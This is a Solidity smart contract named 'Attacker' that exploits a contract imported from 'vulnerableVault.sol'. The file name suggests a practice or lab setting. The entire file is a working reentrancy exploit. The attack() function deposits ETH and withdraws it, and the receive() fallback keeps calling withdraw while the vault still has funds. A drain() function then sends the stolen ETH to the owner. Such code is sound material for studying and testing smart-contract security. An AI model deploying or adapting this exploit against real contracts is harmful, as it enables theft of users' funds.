// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {TestV1} from "./vulnerableVault.sol";

contract Attacker {
    TestV1 private testv1;
    uint256 public attackAmount;
    address owner;

    constructor(TestV1 _testV1){
        testv1 = _testV1;
        owner = msg.sender;
    }

    modifier OnlyOwner{
        require(owner == msg.sender, "Only owner can call function");
        _;
    }
    
    function attack() external payable OnlyOwner{
        require(msg.value > 0, "must send eth");

        attackAmount = msg.value;
        testv1.deposit{value: msg.value}();
        testv1.withdraw(msg.value);
    }

    function drain() external payable OnlyOwner{
        uint256 amount = address(this).balance;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer");
    }


    receive() external payable{
        if (address(testv1).balance >= attackAmount) {
            testv1.withdraw(attackAmount);
        }
    }
}